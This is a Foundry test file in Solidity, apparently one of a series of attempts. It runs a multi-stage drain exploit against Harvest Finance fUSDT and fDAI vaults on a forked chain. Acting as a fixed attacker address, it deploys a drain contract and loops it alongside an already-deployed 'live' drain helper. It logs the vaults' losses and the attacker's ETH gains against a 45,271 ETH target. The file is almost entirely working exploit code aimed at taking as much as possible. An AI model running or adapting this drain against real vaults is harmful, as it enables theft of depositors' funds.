// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 14
/// @notice Simulates the exact current-head continuation: stage4 dYdX repeats, then the live stage5 fDAI helper.
/// @dev Hypothesis: the current fork head may still clear the requested `45,271 ETH` target if the
///      profitable standalone stage4 branch is executed before continuing the already-live fDAI helper.
contract Attempt14 is Test, HarvestConfig {
    struct CombinedState {
        uint256 snapshot;
        uint256 nativeBefore;
        uint256 fusdtBefore;
        uint256 fdaiBefore;
        uint256 targetBalance;
    }

    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
    HarvestDrainMulti internal constant LIVE_FDAI_HELPER =
        HarvestDrainMulti(payable(0x8CfeA4b6d0b946dF3Ee961D0AAd0C38FC2b908B0));

    function setUp() public {
        vm.createSelectFork("ch2");
    }

    function test_probe_stage4_then_existing_stage5() public {
        uint256 stage4MaxRepeats = vm.envOr("HARVEST_TEST_STAGE4_MAX_REPEATS", uint256(30));
        uint256 stage5MaxRepeats = vm.envOr("HARVEST_TEST_STAGE5_MAX_REPEATS", uint256(250));
        bool stopOnStage4LocalLoss = vm.envOr("HARVEST_TEST_STAGE4_STOP_ON_LOCAL_LOSS", true);
        bool stopOnStage5LocalLoss = vm.envOr("HARVEST_TEST_STAGE5_STOP_ON_LOCAL_LOSS", false);

        CombinedState memory state = CombinedState({
            snapshot: vm.snapshotState(),
            nativeBefore: ATTACKER.balance,
            fusdtBefore: FUSDT_VAULT.underlyingBalanceWithInvestment(),
            fdaiBefore: FDAI_VAULT.underlyingBalanceWithInvestment(),
            targetBalance: vm.envOr("HARVEST_TEST_TARGET_BALANCE_WEI", uint256(45_271 ether))
        });

        console.log("COMBINED_NATIVE_BEFORE:", state.nativeBefore);
        console.log("COMBINED_FUSDT_BEFORE:", state.fusdtBefore);
        console.log("COMBINED_FDAI_BEFORE:", state.fdaiBefore);
        console.log("COMBINED_TARGET_BALANCE:", state.targetBalance);
        console.log("COMBINED_LIVE_FDAI_HELPER:", address(LIVE_FDAI_HELPER));

        ResetFUSDTDyDx14MDrain stage4Drain = _deployStage4Drain();
        _runLoop("STAGE4", stage4Drain, FUSDT_VAULT, 3, stage4MaxRepeats, stopOnStage4LocalLoss, 0);
        console.log("COMBINED_NATIVE_AFTER_STAGE4:", ATTACKER.balance);
        console.log("COMBINED_STAGE4_NATIVE_DELTA:", ATTACKER.balance - state.nativeBefore);
        console.log("COMBINED_FUSDT_AFTER_STAGE4:", FUSDT_VAULT.underlyingBalanceWithInvestment());
        console.log("COMBINED_FDAI_AFTER_STAGE4:", FDAI_VAULT.underlyingBalanceWithInvestment());

        (uint256 peakNative, uint256 peakIndex) =
            _runLoop("STAGE5", LIVE_FDAI_HELPER, FDAI_VAULT, 1, stage5MaxRepeats, stopOnStage5LocalLoss, state.targetBalance);

        _logCombinedEnd(state, peakNative, peakIndex);

        bool reverted = vm.revertToState(state.snapshot);
        require(reverted, "snapshot restore failed");
    }

    function _deployStage4Drain() internal returns (ResetFUSDTDyDx14MDrain stage4Drain) {
        vm.startPrank(ATTACKER);
        stage4Drain = new ResetFUSDTDyDx14MDrain();
        vm.stopPrank();
        console.log("COMBINED_STAGE4_HELPER:", address(stage4Drain));
    }

    function _logCombinedEnd(CombinedState memory state, uint256 peakNative, uint256 peakIndex) internal view {
        uint256 nativeAfter = ATTACKER.balance;
        uint256 fusdtAfter = FUSDT_VAULT.underlyingBalanceWithInvestment();
        uint256 fdaiAfter = FDAI_VAULT.underlyingBalanceWithInvestment();

        console.log("COMBINED_NATIVE_AFTER:", nativeAfter);
        console.log("COMBINED_NATIVE_DELTA_TOTAL:", nativeAfter - state.nativeBefore);
        console.log("COMBINED_PEAK_NATIVE:", peakNative);
        console.log("COMBINED_PEAK_NATIVE_DELTA:", peakNative - state.nativeBefore);
        console.log("COMBINED_PEAK_STAGE5_EXEC_INDEX:", peakIndex);
        console.log("COMBINED_TARGET_REACHED:", peakNative >= state.targetBalance);
        console.log("COMBINED_FUSDT_AFTER:", fusdtAfter);
        console.log("COMBINED_FUSDT_DELTA_TOTAL:", state.fusdtBefore - fusdtAfter);
        console.log("COMBINED_FDAI_AFTER:", fdaiAfter);
        console.log("COMBINED_FDAI_DELTA_TOTAL:", state.fdaiBefore - fdaiAfter);
    }

    function _runLoop(
        string memory label,
        HarvestDrainMulti drain,
        IHVault vault,
        uint256 iterations,
        uint256 maxRepeats,
        bool stopOnLocalLoss,
        uint256 targetBalance
    ) internal returns (uint256 peakNative, uint256 peakIndex) {
        peakNative = ATTACKER.balance;

        for (uint256 repeatIndex; repeatIndex < maxRepeats; ++repeatIndex) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = vault.underlyingBalanceWithInvestment();

            uint256 gasBefore = gasleft();
            vm.startPrank(ATTACKER);
            try drain.execute(iterations) {
                vm.stopPrank();
            } catch (bytes memory reason) {
                vm.stopPrank();
                console.log(label, "_REVERT_AT:", repeatIndex + 1);
                console.log(label, "_REVERT_REASON:", _decodeRevert(reason));
                break;
            }
            uint256 gasUsed = gasBefore - gasleft();

            uint256 currentNative = ATTACKER.balance;
            uint256 currentVault = vault.underlyingBalanceWithInvestment();
            uint256 nativeDelta = currentNative - previousNative;
            uint256 vaultDelta = previousVault > currentVault ? previousVault - currentVault : 0;

            console.log(label, "_REPEAT_INDEX:", repeatIndex + 1);
            console.log(label, "_REPEAT_GAS:", gasUsed);
            console.log(label, "_REPEAT_NATIVE_DELTA:", nativeDelta);
            console.log(label, "_REPEAT_VAULT_DELTA:", vaultDelta);
            console.log(label, "_REPEAT_NATIVE_AFTER:", currentNative);
            console.log(label, "_REPEAT_VAULT_AFTER:", currentVault);

            if (currentNative > peakNative) {
                peakNative = currentNative;
                peakIndex = repeatIndex + 1;
            }

            if (targetBalance > 0 && currentNative >= targetBalance) {
                console.log(label, "_TARGET_REACHED_AT:", repeatIndex + 1);
                break;
            }

            if ((currentNative <= previousNative || currentVault >= previousVault) && stopOnLocalLoss) {
                console.log(label, "_STOP_AT_LOCAL_LOSS:", repeatIndex + 1);
                break;
            }
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
